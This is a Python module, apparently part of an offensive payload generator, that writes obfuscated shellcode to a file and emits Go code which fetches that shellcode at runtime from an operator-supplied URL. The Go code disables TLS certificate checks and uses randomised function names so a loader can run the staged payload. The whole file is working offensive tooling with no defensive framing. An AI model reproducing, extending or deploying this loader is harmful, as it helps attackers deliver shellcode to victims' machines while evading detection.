import random
import string
from go.utils.formatters import *

class webdelivery:

    def __init__(self, shellcode: str | bytes | list[str], arguments: dict) -> None:
        self.name = ''.join(random.SystemRandom().choice(string.ascii_lowercase) for _ in range(16))
        if 'outfile' in arguments:
            outfile = arguments['outfile']
        else:
            outfile = 'output.txt'
        self.type = type(shellcode).__name__
        if self.type == 'bytes':
            open(outfile, 'wb').write(shellcode)
        elif self.type == 'str':
            open(outfile, 'w').write(shellcode)
        elif self.type == 'list':
            open(outfile, 'w').write('\n'.join(shellcode))
        print(f'Writing obfuscated shellcode to {outfile}')
        if 'url' not in arguments:
            print('No url specified')
            exit(0)
        else:
            self.url = arguments['url']

    def imports(self) -> list[str]:
        return ['net/http',
                'io',
                'strings',
                'crypto/tls']

    def compilerOptions(self) -> list[str]:
        return []

    def transformer(self, shellcodestring: str) -> str:
        return shellcodestring.format(shellcode=f'{self.name}()')

    def codeblock(self) -> str:
        if self.type == 'bytes':
            return f"""
func {self.name}() []byte {{
    http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{{InsecureSkipVerify: true}}
    resp, _ := http.Get("{self.url}")
    obfuscated, _ := io.ReadAll(resp.Body)
    return obfuscated
}}
"""
        elif self.type == 'str':
            return f"""
func {self.name}() string {{
    http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{{InsecureSkipVerify: true}}
    resp, _ := http.Get("{self.url}")
    body, _ := io.ReadAll(resp.Body)
    obfuscated := string(body)
    return obfuscated
}}
"""
        elif self.type == 'list':
            return f"""
func {self.name}() []string {{
    http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{{InsecureSkipVerify: true}}
    resp, _ := http.Get("{self.url}")
    body, _ := io.ReadAll(resp.Body)
    obfuscated := string(body)
    return strings.Split(obfuscated, "\\n")
}}
"""
